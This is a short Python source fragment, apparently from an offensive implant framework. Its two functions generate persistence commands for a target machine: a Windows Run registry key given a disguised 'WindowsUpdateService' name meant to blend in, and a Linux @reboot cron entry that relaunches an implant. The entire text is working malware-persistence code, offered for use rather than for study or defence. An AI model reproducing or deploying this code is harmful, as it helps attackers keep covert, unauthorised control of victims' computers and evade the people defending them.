def generate_windows_persistence(implant_path, app_name="WindowsUpdateService"):
    """
    Generates a Windows command to add a registry key for persistence.
    This command, when executed on the target, will cause the implant to run on user login.
    """
    # Using a common-sounding name for the registry key to blend in.
    command = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{app_name}" /t REG_SZ /d "{implant_path}" /f'
    return command

def generate_linux_persistence(implant_path):
    """
    Generates a Linux command to add a cron job for persistence.
    This command, when executed on the target, will cause the implant to run on reboot.
    """
    # The command creates a new cron job that executes the implant at every reboot.
    # It first lists existing cron jobs, appends the new one, and then installs the new crontab.
    # This is a common way to add a cron job from the command line without manual editing.
    command = f'(crontab -l 2>/dev/null; echo "@reboot {implant_path}") | crontab -'
    return command
